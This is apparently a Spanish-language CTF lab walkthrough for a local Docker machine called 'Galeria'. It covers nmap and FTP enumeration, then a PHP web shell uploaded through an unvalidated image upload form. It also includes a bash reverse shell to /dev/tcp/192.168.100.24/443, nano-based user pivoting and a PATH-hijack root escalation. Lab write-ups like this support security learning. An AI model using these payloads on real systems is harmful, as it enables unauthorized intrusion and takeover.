- Tags: #Galeria
---
[Maquina Galeria](https://mega.nz/file/SYdiyT4Y#54dLD-sGCP6OAYQBy4zWA2XpGfUURg51mIO-fpLTi_g) --> Fuzzing web sencillo y vulnerabilidad file upload.

```bash
7z x galeria.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh galeria.tar # Desplegamos el laboratorio.
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion ip del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-10000 # 
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo.
nmap -sC -sV -p21,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y la versiones que corren detras de estos puertos
```

**( 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) )** --> Tenemos un servicio web expuesto: **( ubuntuNoble )**
### FAse Enumeracion FTP:

```bash
nmap -sCV --script ftp-anon.nse -p 21 172.17.0.2 # Tenemos habilidato: --> ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

```bash
ftp 172.17.0.2 # Procedemos a conectarnos
Name (172.17.0.2:kali): anonymous --> Enter
```

### Fase Enumeracion Web:
**( 21/tcp open  ftp     vsftpd 3.0.5 )** --> Tenemos un servicio **FTP** expuesto
```bash
/index.html           (Status: 200) [Size: 1772]
/gallery              (Status: 301) [Size: 310] [--> http://172.17.0.2/gallery/]
```

**( http://172.17.0.2/gallery/uploads/handler.php )** -->  Aqui tenemos capacidad de subir imagenes y verificamos que no valida la subidad de archivos.
**( 172.17.0.2/gallery/uploads/images/ )** -> Aqui se cargan las imagenes, y Aprovecharemos para subir una con codigo incrustado para poder controlar un comando a nivel de sistema atraves del metodo **GET**

El archivo que subiremos se llamara: **( cmd.php )** el cual controlaremos el comando que queremos ejecutar con: **( cmd )**
```php
<?php
	system($_GET["cmd"]);
?>
```

**( 172.17.0.2/gallery/uploads/images/cmd.php?cmd=whoami )** --> Ahora tenemos capacida ejecutacion remota de comandos
### Fase Instrusion:
```bash
nc -nlvp 443

172.17.0.2/gallery/uploads/images/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/192.168.100.24/443 <%261'
```

### Fase Escalda Privilegios:
```bash
sudo -l

User www-data may run the following commands on 522bce15769a:
    (gallery) NOPASSWD: /bin/nano
    (www-data) NOPASSWD: /bin/nano
```

```bash
sudo -u gallery /bin/nano #ejecutamos este binario como este usuario para poder pivotear a el

ctrl + R ctrl + X
reset; sh 1>&0 2>&0
```

```bash
sudo -l # Ahora hemos pivoteado como usuario: ( gallery )

User gallery may run the following commands on 522bce15769a:
    (ALL) NOPASSWD: /usr/local/bin/runme # Tenemos una via potencial de elevar privielgios
```

**Nota** --> Analizando el binario probablemente contempla convertir imagenes usando **convert** 
- `system`
- `puts`
- `/var/www/html/gallery/uploads/images/input.png`
- `convert`
- `output.jpg`

###### Explotar el uso de `system()`
El uso de `system()` en binarios con privilegios elevados es critico, Sii el binario ejecuta comandos con argumentos que el nosotros como atacantes controlamos. Permitiendonos inyectar comandos
Secuestraemos el binario si **PATH** no esta controlado, Pensando que el binario ejecuta el comando sin ruta contemplada, Crearemos un ejecutable llamado **Convert** en nuestro directorio personal que es controlado por nosostros como atacante, Logrando secuestar el **path**

```bash
echo -e '#!/bin/bash\nbash' > ~/convert # Este es el contenido de nuestro binario malicioso
chmod +x ~/convert # Damos permisos de ejecucion
export PATH=~/:$PATH # Cambiamos el valor del PATH
sudo /usr/local/bin/runme # Ejecutamos el binario como root
```

```bash
whoami # Ahora tenemos una bash como root.
```